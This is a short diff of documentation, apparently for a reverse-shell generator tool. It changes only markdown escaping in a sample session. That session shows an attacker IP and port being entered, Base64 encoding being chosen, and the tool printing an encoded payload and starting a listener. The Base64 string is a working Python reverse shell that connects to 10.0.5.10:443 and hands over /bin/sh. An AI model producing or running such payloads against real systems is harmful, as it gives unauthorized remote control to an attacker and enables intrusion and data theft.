@@ -24,19 +24,19 @@ Please select a language to use from the list below:
 Please insert your IP address and port number
 ex: 192.168.0.10:443
 
-> 10.0.5.10:443
+\> 10.0.5.10:443
 
 Select an encoding. If you don't want one, select 0:
 [0] None
 [1] URL
 [2] Base64
 
-> 2
+\> 2
 
 Reverse Shell String
-========================================
+\========================================
 cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMC41LjEwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=
-========================================
+\========================================
 
 Spawning the listener on port 443
 Waiting for connection...
